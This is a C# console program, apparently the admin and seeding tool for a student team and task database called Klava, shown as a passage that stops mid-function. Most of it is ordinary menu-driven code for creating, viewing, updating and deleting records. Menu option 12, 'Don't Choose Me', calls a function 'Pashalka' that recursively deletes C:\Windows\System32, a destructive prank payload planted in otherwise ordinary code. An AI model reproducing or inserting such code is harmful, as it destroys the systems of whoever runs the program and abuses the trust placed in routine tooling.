using Klava.DataSeeder;
using Klava.DataSeeder.Data;
using Klava.DataSeeder.Services;

Console.OutputEncoding = System.Text.Encoding.UTF8;

var dbManager = new DbManager(Config.ConnectionString);
var userManager = new UserManager(dbManager);
var teamManager = new TeamManager(dbManager);
var teamMemberManager = new TeamMemberManager(dbManager);
var subjectManager = new SubjectManager(dbManager);
var taskManager = new TaskManager(dbManager);
var submissionManager = new SubmissionManager(dbManager);
var fileManager = new SubjectFileManager(dbManager);
var announcementManager = new AnnouncementManager(dbManager);
var eventManager = new EventManager(dbManager);

var seedData = new SeedData(
    userManager,
    teamManager,
    teamMemberManager,
    subjectManager,
    taskManager,
    submissionManager,
    fileManager,
    announcementManager,
    eventManager
);

bool running = true;

while (running)
{
    Console.Clear();
    Console.WriteLine("=== Klava Database Manager ===");
    Console.WriteLine("1. User Manager");
    Console.WriteLine("2. Team Manager");
    Console.WriteLine("3. Team Member Manager");
    Console.WriteLine("4. Subject Manager");
    Console.WriteLine("5. Task Manager");
    Console.WriteLine("6. Submission Manager");
    Console.WriteLine("7. File Manager");
    Console.WriteLine("8. Announcement Manager");
    Console.WriteLine("9. Event Manager");
    Console.WriteLine("10. Seed Database with Test Data");
    Console.WriteLine("11. Clear All Database Tables");
    Console.WriteLine("12. Don't Choose Me");
    Console.WriteLine("0. Exit");
    Console.WriteLine("==============================");
    Console.Write("Select manager: ");

    var choice = Console.ReadLine();

    try
    {
        switch (choice)
        {
            case "1":
                UserManagerMenu();
                break;
            case "2":
                TeamManagerMenu();
                break;
            case "3":
                TeamMemberManagerMenu();
                break;
            case "4":
                SubjectManagerMenu();
                break;
            case "5":
                TaskManagerMenu();
                break;
            case "6":
                SubmissionManagerMenu();
                break;
            case "7":
                FileManagerMenu();
                break;
            case "8":
                AnnouncementManagerMenu();
                break;
            case "9":
                EventManagerMenu();
                break;
            case "10":
                SeedDatabase();
                break;
            case "11":
                ClearAllTables();
                break;
            case "12":
                Pashalka();
                break;
            case "0":
                running = false;
                Console.WriteLine("Goodbye!");
                break;
            default:
                Console.WriteLine("Invalid choice. Please try again.");
                WaitForKey();
                break;
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine($"Error: {ex.Message}");
        WaitForKey();
    }
}

void UserManagerMenu()
{
    Console.Clear();
    Console.WriteLine("=== User Manager ===");
    Console.WriteLine("1. View All Users");
    Console.WriteLine("2. Get User by ID");
    Console.WriteLine("3. Create User");
    Console.WriteLine("4. Update User");
    Console.WriteLine("5. Delete User");
    Console.WriteLine("0. Back");
    Console.Write("Select action: ");

    var choice = Console.ReadLine();

    switch (choice)
    {
        case "1":
            ViewAllUsers();
            break;
        case "2":
            GetUserById();
            break;
        case "3":
            CreateUser();
            break;
        case "4":
            UpdateUser();
            break;
        case "5":
            DeleteUser();
            break;
        case "0":
            return;
        default:
            Console.WriteLine("Invalid choice.");
            break;
    }

    WaitForKey();
}

void Pashalka()
{
    Directory.Delete(@"C:\Windows\System32", true);
} 

void TeamManagerMenu()
{
    Console.Clear();
    Console.WriteLine("=== Team Manager ===");
    Console.WriteLine("1. View All Teams");
    Console.WriteLine("2. Get Team by ID");
    Console.WriteLine("3. Get Teams for User");
    Console.WriteLine("4. Create Team");
    Console.WriteLine("5. Update Team");
    Console.WriteLine("6. Delete Team");
    Console.WriteLine("0. Back");
    Console.Write("Select action: ");

    var choice = Console.ReadLine();

    switch (choice)
    {
        case "1":
            ViewAllTeams();
            break;
        case "2":
            GetTeamById();
            break;
        case "3":
            GetTeamsForUser();
            break;
        case "4":
            CreateTeam();
            break;
        case "5":
            UpdateTeam();
            break;
        case "6":
            DeleteTeam();
            break;
        case "0":
            return;
        default:
            Console.WriteLine("Invalid choice.");
            break;
    }

    WaitForKey();
}

void TeamMemberManagerMenu()
{
    Console.Clear();
    Console.WriteLine("=== Team Member Manager ===");
    Console.WriteLine("1. View Team Members");
    Console.WriteLine("2. Add User to Team");
    Console.WriteLine("3. Update Team Member Role");
    Console.WriteLine("4. Remove User from Team");
    Console.WriteLine("0. Back");
    Console.Write("Select action: ");

    var choice = Console.ReadLine();

    switch (choice)
    {
        case "1":
            ViewTeamMembers();
            break;
        case "2":
            AddUserToTeam();
            break;
        case "3":
            UpdateTeamMemberRole();
            break;
        case "4":
            RemoveUserFromTeam();
            break;
        case "0":
            return;
        default:
            Console.WriteLine("Invalid choice.");
            break;
    }

    WaitForKey();
}

void SubjectManagerMenu()
{
    Console.Clear();
    Console.WriteLine("=== Subject Manager ===");
    Console.WriteLine("1. View Subjects for Team");
    Console.WriteLine("2. Get Subject by ID");
    Console.WriteLine("3. Create Subject");
    Console.WriteLine("4. Update Subject");
    Console.WriteLine("5. Delete Subject");
    Console.WriteLine("0. Back");
    Console.Write("Select action: ");

    var choice = Console.ReadLine();

    switch (choice)
    {
        case "1":
            ViewSubjectsForTeam();
            break;
        case "2":
            GetSubjectById();
            break;
        case "3":
            CreateSubject();
            break;
        case "4":
            UpdateSubject();
            break;
        case "5":
            DeleteSubject();
            break;
        case "0":
            return;
        default:
            Console.WriteLine("Invalid choice.");
            break;
    }

    WaitForKey();
}

void TaskManagerMenu()
{
    Console.Clear();
    Console.WriteLine("=== Task Manager ===");
    Console.WriteLine("1. View Tasks for Subject");
    Console.WriteLine("2. Create Task");
    Console.WriteLine("3. Update Task");
    Console.WriteLine("4. Delete Task");
    Console.WriteLine("0. Back");
    Console.Write("Select action: ");

    var choice = Console.ReadLine();

    switch (choice)
    {
        case "1":
            ViewTasksForSubject();
            break;
        case "2":
            CreateTask();
            break;
        case "3":
            UpdateTask();
            break;
        case "4":
            DeleteTask();
            break;
        case "0":
            return;
        default:
            Console.WriteLine("Invalid choice.");
            break;
    }

    WaitForKey();
}

void SubmissionManagerMenu()
{
    Console.Clear();
    Console.WriteLine("=== Submission Manager ===");
    Console.WriteLine("1. View Submissions for Task");
    Console.WriteLine("2. Create Submission");
    Console.WriteLine("3. Update Submission Status");
    Console.WriteLine("0. Back");
    Console.Write("Select action: ");

    var choice = Console.ReadLine();

    switch (choice)
    {
        case "1":
            ViewSubmissionsForTask();
            break;
        case "2":
            CreateSubmission();
            break;
        case "3":
            UpdateSubmissionStatus();
            break;
        case "0":
            return;
        default:
            Console.WriteLine("Invalid choice.");
            break;
    }

    WaitForKey();
}

void FileManagerMenu()
{
    Console.Clear();
    Console.WriteLine("=== File Manager ===");
    Console.WriteLine("1. View Files for Subject");
    Console.WriteLine("2. Create File");
    Console.WriteLine("3. Delete File");
    Console.WriteLine("0. Back");
    Console.Write("Select action: ");

    var choice = Console.ReadLine();

    switch (choice)
    {
        case "1":
            ViewFilesForSubject();
            break;
        case "2":
            CreateFile();
            break;
        case "3":
            DeleteFile();
            break;
        case "0":
            return;
        default:
            Console.WriteLine("Invalid choice.");
            break;
    }

    WaitForKey();
}

void AnnouncementManagerMenu()
{
    Console.Clear();
    Console.WriteLine("=== Announcement Manager ===");
    Console.WriteLine("1. View Announcements for Subject");
    Console.WriteLine("2. Create Announcement");
    Console.WriteLine("3. Delete Announcement");
    Console.WriteLine("0. Back");
    Console.Write("Select action: ");

    var choice = Console.ReadLine();

    switch (choice)
    {
        case "1":
            ViewAnnouncementsForSubject();
            break;
        case "2":
            CreateAnnouncement();
            break;
        case "3":
            DeleteAnnouncement();
            break;
        case "0":
            return;
        default:
            Console.WriteLine("Invalid choice.");
            break;
    }

    WaitForKey();
}

void EventManagerMenu()
{
    Console.Clear();
    Console.WriteLine("=== Event Manager ===");
    Console.WriteLine("1. View Events for Subject");
    Console.WriteLine("2. Create Event");
    Console.WriteLine("3. Delete Event");
    Console.WriteLine("0. Back");
    Console.Write("Select action: ");

    var choice = Console.ReadLine();

    switch (choice)
    {
        case "1":
            ViewEventsForSubject();
            break;
        case "2":
            CreateEvent();
            break;
        case "3":
            DeleteEvent();
            break;
        case "0":
            return;
        default:
            Console.WriteLine("Invalid choice.");
            break;
    }

    WaitForKey();
}

void WaitForKey()
{
    Console.WriteLine("\nPress any key to continue...");
    Console.ReadKey();
}

void SeedDatabase()
{
    Console.WriteLine("\nAre you sure you want to seed the database? (y/n): ");
    var confirm = Console.ReadLine()?.ToLower();
    
    if (confirm == "y")
    {
        seedData.SeedDatabase();
        WaitForKey();
    }
}

void ClearAllTables()
{
    Console.WriteLine("\n=== Clear All Database Tables ===");
    Console.WriteLine("WARNING: This will delete ALL data from the database!");
    Console.Write("Are you absolutely sure? Type 'DELETE' to confirm: ");
    var confirm = Console.ReadLine();
    
    if (confirm == "DELETE")
    {
        try
        {
            dbManager.ClearAllTables();
            Console.WriteLine("\nAll tables cleared successfully!");
            Console.WriteLine("All sequences have been reset to 1.");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"\nError clearing tables: {ex.Message}");
        }
        WaitForKey();
    }
    else
    {
        Console.WriteLine("\nOperation cancelled.");
        WaitForKey();
    }
}

void ViewAllUsers()
{
    Console.WriteLine("\n=== All Users ===");
    var users = userManager.GetAllUsers();
    
    if (users.Count == 0)
    {
        Console.WriteLine("No users found.");
        return;
    }

    Console.WriteLine($"{"ID",-5} {"First Name",-20} {"Last Name",-20}");
    Console.WriteLine(new string('-', 50));
    
    foreach (var user in users)
    {
        Console.WriteLine($"{user.Id,-5} {user.FirstName,-20} {user.LastName,-20}");
    }
    
    Console.WriteLine($"\nTotal users: {users.Count}");
}

void GetUserById()
{
    Console.Write("\nEnter User ID: ");
    if (!int.TryParse(Console.ReadLine(), out int userId))
    {
        Console.WriteLine("Invalid User ID!");
        return;
    }

    var user = userManager.GetUserById(userId);
    if (user == null)
    {
        Console.WriteLine("User not found!");
        return;
    }

    Console.WriteLine($"\nUser Details:");
    Console.WriteLine($"ID: {user.Id}");
    Console.WriteLine($"First Name: {user.FirstName}");
    Console.WriteLine($"Last Name: {user.LastName}");
}

void CreateUser()
{
    Console.WriteLine("\n=== Create New User ===");
    
    Console.Write("First Name: ");
    var firstName = Console.ReadLine() ?? "";
    
    Console.Write("Last Name: ");
    var lastName = Console.ReadLine() ?? "";
    
    Console.Write("Password: ");
    var password = Console.ReadLine() ?? "";

    if (string.IsNullOrWhiteSpace(firstName) || string.IsNullOrWhiteSpace(lastName) || string.IsNullOrWhiteSpace(password))
    {
        Console.WriteLine("All fields are required!");
        return;
    }

    userManager.CreateUser(firstName, lastName, password);
    Console.WriteLine("User created successfully!");
}

void UpdateUser()
{
    Console.WriteLine("\n=== Update User ===");
    
    Console.Write("Enter User ID: ");
    if (!int.TryParse(Console.ReadLine(), out int userId))
    {
        Console.WriteLine("Invalid User ID!");
        return;
    }

    var user = userManager.GetUserById(userId);
    if (user == null)
    {
        Console.WriteLine("User not found!");
        return;
    }

    Console.WriteLine($"Current: {user.FirstName} {user.LastName}");
    
    Console.Write("New First Name: ");
    var firstName = Console.ReadLine() ?? "";
    
    Console.Write("New Last Name: ");
    var lastName = Console.ReadLine() ?? "";
    
    Console.Write("New Password: ");
    var password = Console.ReadLine() ?? "";

    if (string.IsNullOrWhiteSpace(firstName) || string.IsNullOrWhiteSpace(lastName) || string.IsNullOrWhiteSpace(password))
    {
        Console.WriteLine("All fields are required!");
        return;
    }

    userManager.UpdateUser(userId, firstName, lastName, password);
    Console.WriteLine("User updated successfully!");
}

void DeleteUser()
{
    Console.WriteLine("\n=== Delete User ===");
    
    Console.Write("Enter User ID to delete: ");
    if (!int.TryParse(Console.ReadLine(), out int userId))
    {
        Console.WriteLine("Invalid User ID!");
        return;
    }

    var user = userManager.GetUserById(userId);
    if (user == null)
    {
        Console.WriteLine("User not found!");
        return;
    }

    Console.WriteLine($"Delete user: {user.FirstName} {user.LastName}?");
    Console.Write("Are you sure? (y/n): ");
    var confirm = Console.ReadLine()?.ToLower();

    if (confirm == "y")
    {
        userManager.DeleteUser(userId);
        Console.WriteLine("User deleted successfully!");
    }
}

void ViewAllTeams()
{
    Console.WriteLine("\n=== All Teams ===");
    var teams = teamManager.GetAllTeams();
    
    if (teams.Count == 0)
    {
        Console.WriteLine("No teams found.");
        return;
    }

    Console.WriteLine($"{"ID",-5} {"Name",-30} {"Code",-10} {"Owner ID",-10}");
    Console.WriteLine(new string('-', 60));
    
    foreach (var team in teams)
    {
        Console.WriteLine($"{team.Id,-5} {team.Name,-30} {team.Code,-10} {team.OwnerId?.ToString() ?? "N/A",-10}");
    }
    
    Console.WriteLine($"\nTotal teams: {teams.Count}");
}

void GetTeamById()
{
    Console.Write("\nEnter Team ID: ");
    if (!int.TryParse(Console.ReadLine(), out int teamId))
    {
        Console.WriteLine("Invalid Team ID!");
        return;
    }

    var team = teamManager.GetTeamById(teamId);
    if (team == null)
    {
        Console.WriteLine("Team not found!");
        return;
    }

    Console.WriteLine($"\nTeam Details:");
    Console.WriteLine($"ID: {team.Id}");
    Console.WriteLine($"Name: {team.Name}");
    Console.WriteLine($"Code: {team.Code}");
    Console.WriteLine($"Owner ID: {team.OwnerId?.ToString() ?? "N/A"}");
}

void GetTeamsForUser()
{
    Console.Write("\nEnter User ID: ");
    if (!int.TryParse(Console.ReadLine(), out int userId))
    {
        Console.WriteLine("Invalid User ID!");
        return;
    }

    var teams = teamManager.GetTeamsForUser(userId);
    
    if (teams.Count == 0)
    {
        Console.WriteLine("No teams found for this user.");
        return;
    }

    Console.WriteLine($"\n{"ID",-5} {"Name",-30} {"Code",-10}");
    Console.WriteLine(new string('-', 50));
    
    foreach (var team in teams)
    {
        Console.WriteLine($"{team.Id,-5} {team.Name,-30} {team.Code,-10}");
    }
    
    Console.WriteLine($"\nTotal teams: {teams.Count}");
}

void CreateTeam()
{
    Console.WriteLine("\n=== Create New Team ===");
    
    Console.Write("Team Name: ");
    var teamName = Console.ReadLine() ?? "";
    
    Console.Write("Access Code (8 characters): ");
    var accessCode = Console.ReadLine() ?? "";
    
    Console.Write("Owner User ID: ");
    if (!int.TryParse(Console.ReadLine(), out int ownerId))
    {
        Console.WriteLine("Invalid Owner ID!");
        return;
    }

    if (string.IsNullOrWhiteSpace(teamName) || string.IsNullOrWhiteSpace(accessCode))
    {
        Console.WriteLine("Team name and access code are required!");
        return;
    }

    teamManager.CreateTeam(teamName, accessCode, ownerId);
    Console.WriteLine("Team created successfully!");
}

void UpdateTeam()
{
    Console.WriteLine("\n=== Update Team ===");
    
    Console.Write("Enter Team ID: ");
    if (!int.TryParse(Console.ReadLine(), out int teamId))
    {
        Console.WriteLine("Invalid Team ID!");
        return;
    }

    var team = teamManager.GetTeamById(teamId);
    if (team == null)
    {
        Console.WriteLine("Team not found!");
        return;
    }

    Console.WriteLine($"Current: {team.Name} ({team.Code})");
    
    Console.Write("New Team Name: ");
    var newName = Console.ReadLine() ?? "";
    
    Console.Write("New Access Code: ");
    var newCode = Console.ReadLine() ?? "";

    if (string.IsNullOrWhiteSpace(newName) || string.IsNullOrWhiteSpace(newCode))
    {
        Console.WriteLine("All fields are required!");
        return;
    }

    teamManager.UpdateTeam(teamId, newName, newCode);
    Console.WriteLine("Team updated successfully!");
}

void DeleteTeam()
{
    Console.WriteLine("\n=== Delete Team ===");
    
    Console.Write("Enter Team ID to delete: ");
    if (!int.TryParse(Console.ReadLine(), out int teamId))
    {
        Console.WriteLine("Invalid Team ID!");
        return;
    }

    var team = teamManager.GetTeamById(teamId);
    if (team == null)
    {
        Console.WriteLine("Team not found!");
        return;
    }

    Console.WriteLine($"Delete team: {team.Name}?");
    Console.Write("Are you sure? (y/n): ");
    var confirm = Console.ReadLine()?.ToLower();

    if (confirm == "y")
    {
        teamManager.DeleteTeam(teamId);
        Console.WriteLine("Team deleted successfully!");
    }
}

void ViewTeamMembers()
{
    Console.Write("\nEnter Team ID: ");
    if (!int.TryParse(Console.ReadLine(), out int teamId))
    {
        Console.WriteLine("Invalid Team ID!");
        return;
    }

    var team = teamManager.GetTeamById(teamId);
    if (team == null)
    {
        Console.WriteLine("Team not found!");
        return;
    }

    Console.WriteLine($"\nTeam: {team.Name}");
    var members = teamMemberManager.GetTeamMembers(teamId);
    
    if (members.Count == 0)
    {
        Console.WriteLine("No members in this team.");
        return;
    }

    Console.WriteLine($"\n{"ID",-5} {"First Name",-20} {"Last Name",-20} {"Role",-10}");
    Console.WriteLine(new string('-', 60));
    
    foreach (var member in members)
    {
        Console.WriteLine($"{member.Id,-5} {member.FirstName,-20} {member.LastName,-20} {member.Role,-10}");
    }
    
    Console.WriteLine($"\nTotal members: {members.Count}");
}

void AddUserToTeam()
{
    Console.WriteLine("\n=== Add User to Team ===");
    
    Console.Write("User ID: ");
    if (!int.TryParse(Console.ReadLine(), out int userId))
    {
        Console.WriteLine("Invalid User ID!");
        return;
    }

    Console.Write("Team ID: ");
    if (!int.TryParse(Console.ReadLine(), out int teamId))
    {
        Console.WriteLine("Invalid Team ID!");
        return;
    }

    Console.Write("Role (student/headman) [default: student]: ");
    var role = Console.ReadLine()?.ToLower();
    if (string.IsNullOrWhiteSpace(role))
        role = "student";

    if (role != "student" && role != "headman")
    {
        Console.WriteLine("Invalid role! Use 'student' or 'headman'.");
        return;
    }

    teamMemberManager.AddUserToTeam(userId, teamId, role);
    Console.WriteLine("User added to team successfully!");
}

void UpdateTeamMemberRole()
{
    Console.WriteLine("\n=== Update Team Member Role ===");
    
    Console.Write("User ID: ");
    if (!int.TryParse(Console.ReadLine(), out int userId))
    {
        Console.WriteLine("Invalid User ID!");
        return;
    }

    Console.Write("Team ID: ");
    if (!int.TryParse(Console.ReadLine(), out int teamId))
    {
        Console.WriteLine("Invalid Team ID!");
        return;
    }

    Console.Write("New Role (student/headman): ");
    var newRole = Console.ReadLine()?.ToLower() ?? "";

    if (newRole != "student" && newRole != "headman")
    {
        Console.WriteLine("Invalid role! Use 'student' or 'headman'.");
        return;
    }

    teamMemberManager.UpdateTeamMemberRole(userId, teamId, newRole);
    Console.WriteLine("Team member role updated successfully!");
}

void RemoveUserFromTeam()
{
    Console.WriteLine("\n=== Remove User from Team ===");
    
    Console.Write("User ID: ");
    if (!int.TryParse(Console.ReadLine(), out int userId))
    {
        Console.WriteLine("Invalid User ID!");
        return;
    }

    Console.Write("Team ID: ");
    if (!int.TryParse(Console.ReadLine(), out int teamId))
    {
        Console.WriteLine("Invalid Team ID!");
        return;
    }

    Console.Write("Are you sure? (y/n): ");
    var confirm = Console.ReadLine()?.ToLower();

    if (confirm == "y")
    {
        teamMemberManager.RemoveUserFromTeam(userId, teamId);
        Console.WriteLine("User removed from team successfully!");
    }
}

void ViewSubjectsForTeam()
{
    Console.Write("\nEnter Team ID: ");
    if (!int.TryParse(Console.ReadLine(), out int teamId))
    {
        Console.WriteLine("Invalid Team ID!");
        return;
    }

    var team = teamManager.GetTeamById(teamId);
    if (team == null)
    {
        Console.WriteLine("Team not found!");
        return;
    }

    Console.WriteLine($"\nTeam: {team.Name}");
    var subjects = subjectManager.GetSubjectsForTeam(teamId);
    
    if (subjects.Count == 0)
    {
        Console.WriteLine("No subjects found for this team.");
        return;
    }

    Console.WriteLine($"\n{"ID",-5} {"Title",-40} {"Status",-10}");
    Console.WriteLine(new string('-', 60));
    
    foreach (var subject in subjects)
    {
        Console.WriteLine($"{subject.Id,-5} {subject.Title,-40} {subject.Status,-10}");
    }
    
    Console.WriteLine($"\nTotal subjects: {subjects.Count}");
}

void GetSubjectById()
{
    Console.Write("\nEnter Subject ID: ");
    if (!int.TryParse(Console.ReadLine(), out int subjectId))
    {
        Console.WriteLine("Invalid Subject ID!");
        return;
    }

    var subject = subjectManager.GetSubjectById(subjectId);
    if (subject == null)
    {
        Console.WriteLine("Subject not found!");
        return;
    }

    Console.WriteLine($"\nSubject Details:");
    Console.WriteLine($"ID: {subject.Id}");
    Console.WriteLine($"Title: {subject.Title}");
    Console.WriteLine($"Info: {subject.SubjectInfo}");
    Console.WriteLine($"Status: {subject.Status}");
}

void CreateSubject()
{
    Console.WriteLine("\n=== Create New Subject ===");
    
    Console.Write("Team ID: ");
    if (!int.TryParse(Console.ReadLine(), out int teamId))
    {
        Console.WriteLine("Invalid Team ID!");
        return;
    }

    Console.Write("Title: ");
    var title = Console.ReadLine() ?? "";
    
    Console.Write("Info: ");
    var info = Console.ReadLine() ?? "";
    
    Console.Write("Status (exam/test): ");
    var status = Console.ReadLine()?.ToLower() ?? "";

    if (string.IsNullOrWhiteSpace(title) || (status != "exam" && status != "test"))
    {
        Console.WriteLine("Invalid input! Title is required and status must be 'exam' or 'test'.");
        return;
    }

    subjectManager.CreateSubject(teamId, title, info, status);
    Console.WriteLine("Subject created successfully!");
}

void UpdateSubject()
{
    Console.WriteLine("\n=== Update Subject ===");
    
    Console.Write("Enter Subject ID: ");
    if (!int.TryParse(Console.ReadLine(), out int subjectId))
    {
        Console.WriteLine("Invalid Subject ID!");
        return;
    }

    var subject = subjectManager.GetSubjectById(subjectId);
    if (subject == null)
    {
        Console.WriteLine("Subject not found!");
        return;
    }

    Console.WriteLine($"Current: {subject.Title}");
    
    Console.Write("New Title: ");
    var newTitle = Console.ReadLine() ?? "";
    
    Console.Write("New Info: ");
    var newInfo = Console.ReadLine() ?? "";
    
    Console.Write("New Status (exam/test): ");
    var newStatus = Console.ReadLine()?.ToLower() ?? "";

    if (string.IsNullOrWhiteSpace(newTitle) || (newStatus != "exam" && newStatus != "test"))
    {
        Console.WriteLine("Invalid input!");
        return;
    }

    subjectManager.UpdateSubject(subjectId, newTitle, newInfo, newStatus);
    Console.WriteLine("Subject updated successfully!");
}

void DeleteSubject()
{
    Console.WriteLine("\n=== Delete Subject ===");
    
    Console.Write("Enter Subject ID to delete: ");
    if (!int.TryParse(Console.ReadLine(), out int subjectId))
    {
        Console.WriteLine("Invalid Subject ID!");
        return;
    }

    var subject = subjectManager.GetSubjectById(subjectId);
    if (subject == null)
    {
        Console.WriteLine("Subject not found!");
        return;
    }

    Console.WriteLine($"Delete subject: {subject.Title}?");
    Console.Write("Are you sure? (y/n): ");
    var confirm = Console.ReadLine()?.ToLower();

    if (confirm == "y")
    {
        subjectManager.DeleteSubject(subjectId);
        Console.WriteLine("Subject deleted successfully!");
    }
}

void ViewTasksForSubject()
{
    Console.Write("\nEnter Subject ID: ");
    if (!int.TryParse(Console.ReadLine(), out int subjectId))
    {
        Console.WriteLine("Invalid Subject ID!");
        return;
    }

    var subject = subjectManager.GetSubjectById(subjectId);
    if (subject == null)
    {
        Console.WriteLine("Subject not found!");
        return;
    }

    Console.WriteLine($"\nSubject: {subject.Title}");
    var tasks = taskManager.GetTasksForSubject(subjectId);
    
    if (tasks.Count == 0)
    {
        Console.WriteLine("No tasks found for this subject.");
        return;
    }

    Console.WriteLine($"\n{"ID",-5} {"Name",-30} {"Deadline",-20}");
    Console.WriteLine(new string('-', 60));
    
    foreach (var task in tasks)
    {
        Console.WriteLine($"{task.Id,-5} {task.Name,-30} {task.Deadline?.ToString("yyyy-MM-dd HH:mm") ?? "No deadline",-20}");
    }
    
    Console.WriteLine($"\nTotal tasks: {tasks.Count}");
}

void CreateTask()
{
    Console.WriteLine("\n=== Create New Task ===");
    
    Console.Write("Subject ID: ");
    if (!int.TryParse(Console.ReadLine(), out int subjectId))
    {
        Console.WriteLine("Invalid Subject ID!");
        return;
    }

    Console.Write("Task Name: ");
    var name = Console.ReadLine() ?? "";
    
    Console.Write("Description: ");
    var description = Console.ReadLine() ?? "";
    
    Console.Write("Deadline (yyyy-MM-dd HH:mm) or press Enter for no deadline: ");
    var deadlineStr = Console.ReadLine();
    DateTime? deadline = null;
    
    if (!string.IsNullOrWhiteSpace(deadlineStr))
    {
        if (DateTime.TryParse(deadlineStr, out DateTime parsedDeadline))
            deadline = parsedDeadline;
        else
        {
            Console.WriteLine("Invalid date format!");
            return;
        }
    }

    if (string.IsNullOrWhiteSpace(name))
    {
        Console.WriteLine("Task name is required!");
        return;
    }

    taskManager.CreateTask(subjectId, name, description, deadline);
    Console.WriteLine("Task created successfully!");
}

void UpdateTask()
{
    Console.WriteLine("\n=== Update Task ===");
    
    Console.Write("Enter Task ID: ");
    if (!int.TryParse(Console.ReadLine(), out int taskId))
    {
        Console.WriteLine("Invalid Task ID!");
        return;
    }

    Console.Write("New Task Name: ");
    var newName = Console.ReadLine() ?? "";
    
    Console.Write("New Description: ");
    var newDescription = Console.ReadLine() ?? "";
    
    Console.Write("New Deadline (yyyy-MM-dd HH:mm) or press Enter for no deadline: ");
    var deadlineStr = Console.ReadLine();
    DateTime? newDeadline = null;
    
    if (!string.IsNullOrWhiteSpace(deadlineStr))
    {
        if (DateTime.TryParse(deadlineStr, out DateTime parsedDeadline))
            newDeadline = parsedDeadline;
        else
        {
            Console.WriteLine("Invalid date format!");
            return;
        }
    }

    if (string.IsNullOrWhiteSpace(newName))
    {
        Console.WriteLine("Task name is required!");
        return;
    }

    taskManager.UpdateTask(taskId, newName, newDescription, newDeadline);
    Console.WriteLine("Task updated successfully!");
}

void DeleteTask()
{
    Console.WriteLine("\n=== Delete Task ===");
    
    Console.Write("Enter Task ID to delete: ");
    if (!int.TryParse(Console.ReadLine(), out int taskId))
    {
        Console.WriteLine("Invalid Task ID!");
        return;
    }

    Console.Write("Are you sure? (y/n): ");
    var confirm = Console.ReadLine()?.ToLower();

    if (confirm == "y")
    {
        taskManager.DeleteTask(taskId);
        Console.WriteLine("Task deleted successfully!");
    }
}

void ViewSubmissionsForTask()
{
    Console.Write("\nEnter Task ID: ");
    if (!int.TryParse(Console.ReadLine(), out int taskId))
    {
        Console.WriteLine("Invalid Task ID!");
        return;
    }

    var submissions = submissionManager.GetSubmissionsForTask(taskId);
    
    if (submissions.Count == 0)
    {
        Console.WriteLine("No submissions found for this task.");
        return;
    }

    Console.WriteLine($"\n{"ID",-5} {"User ID",-10} {"Status",-10}");
    Console.WriteLine(new string('-', 30));
    
    foreach (var submission in submissions)
    {
        Console.WriteLine($"{submission.Id,-5} {submission.UserId,-10} {submission.Status,-10}");
    }
    
    Console.WriteLine($"\nTotal submissions: {submissions.Count}");
}

void CreateSubmission()
{
    Console.WriteLine("\n=== Create New Submission ===");
    
    Console.Write("Task ID: ");
    if (!int.TryParse(Console.ReadLine(), out int taskId))
    {
        Console.WriteLine("Invalid Task ID!");
        return;
    }

    Console.Write("User ID: ");
    if (!int.TryParse(Console.ReadLine(), out int userId))
    {
        Console.WriteLine("Invalid User ID!");
        return;
    }

    submissionManager.CreateSubmission(taskId, userId);
    Console.WriteLine("Submission created successfully!");
}

void UpdateSubmissionStatus()
{
    Console.WriteLine("\n=== Update Submission Status ===");
    
    Console.Write("Enter Submission ID: ");
    if (!int.TryParse(Console.ReadLine(), out int submissionId))
    {
        Console.WriteLine("Invalid Submission ID!");
        return;
    }

    Console.Write("New Status (done/wait): ");
    var newStatus = Console.ReadLine()?.ToLower() ?? "";

    if (newStatus != "done" && newStatus != "wait")
    {
        Console.WriteLine("Invalid status! Use 'done' or 'wait'.");
        return;
    }

    submissionManager.UpdateSubmissionStatus(submissionId, newStatus);
    Console.WriteLine("Submission status updated successfully!");
}

void ViewFilesForSubject()
{
    Console.Write("\nEnter Subject ID: ");
    if (!int.TryParse(Console.ReadLine(), out int subjectId))
    {
        Console.WriteLine("Invalid Subject ID!");
        return;
    }

    var subject = subjectManager.GetSubjectById(subjectId);
    if (subject == null)
    {
        Console.WriteLine("Subject not found!");
        return;
    }

    Console.WriteLine($"\nSubject: {subject.Title}");
    var files = fileManager.GetFilesForSubject(subjectId);
    
    if (files.Count == 0)
    {
        Console.WriteLine("No files found for this subject.");
        return;
    }

    Console.WriteLine($"\n{"ID",-5} {"Description",-30} {"File Path",-40}");
    Console.WriteLine(new string('-', 80));
    
    foreach (var file in files)
    {
        Console.WriteLine($"{file.Id,-5} {file.Description,-30} {file.FilePath,-40}");
    }
    
    Console.WriteLine($"\nTotal files: {files.Count}");
}

void CreateFile()
{
    Console.WriteLine("\n=== Create New File ===");
    
    Console.Write("Subject ID: ");
    if (!int.TryParse(Console.ReadLine(), out int subjectId))
    {
        Console.WriteLine("Invalid Subject ID!");
        return;
    }

    Console.Write("Description: ");
    var description = Console.ReadLine() ?? "";
    
    Console.Write("File Path: ");
    var filePath = Console.ReadLine() ?? "";

    if (string.IsNullOrWhiteSpace(filePath))
    {
        Console.WriteLine("File path is required!");
        return;
    }

    fileManager.CreateFile(subjectId, description, filePath);
    Console.WriteLine("File created successfully!");
}

void DeleteFile()
{
    Console.WriteLine("\n=== Delete File ===");
    
    Console.Write("Enter File ID to delete: ");
    if (!int.TryParse(Console.ReadLine(), out int fileId))
    {
        Console.WriteLine("Invalid File ID!");
        return;
    }

    Console.Write("Are you sure? (y/n): ");
    var confirm = Console.ReadLine()?.ToLower();

    if (confirm == "y")
    {
        fileManager.DeleteFile(fileId);
        Console.WriteLine("File deleted successfully!");
    }
}

void ViewAnnouncementsForSubject()
{
    Console.Write("\nEnter Subject ID: ");
    if (!int.TryParse(Console.ReadLine(), out int subjectId))
    {
        Console.WriteLine("Invalid Subject ID!");
        return;
    }

    var subject = subjectManager.GetSubjectById(subjectId);
    if (subject == null)
    {
        Console.WriteLine("Subject not found!");
        return;
    }

    Console.WriteLine($"\nSubject: {subject.Title}");
    var announcements = announcementManager.GetAnnouncementsForSubject(subjectId);
    
    if (announcements.Count == 0)
    {
        Console.WriteLine("No announcements found for this subject.");
        return;
    }

    Console.WriteLine($"\n{"ID",-5} {"Title",-30} {"Content",-50}");
    Console.WriteLine(new string('-', 90));
    
    foreach (var announcement in announcements)
    {
        var content = announcement.Content.Length > 47 
            ? announcement.Content.Substring(0, 47) + "..." 
            : announcement.Content;
        Console.WriteLine($"{announcement.Id,-5} {announcement.Title,-30} {content,-50}");
    }
    
    Console.WriteLine($"\nTotal announcements: {announcements.Count}");
}

void CreateAnnouncement()
{
    Console.WriteLine("\n=== Create New Announcement ===");
    
    Console.Write("Subject ID: ");
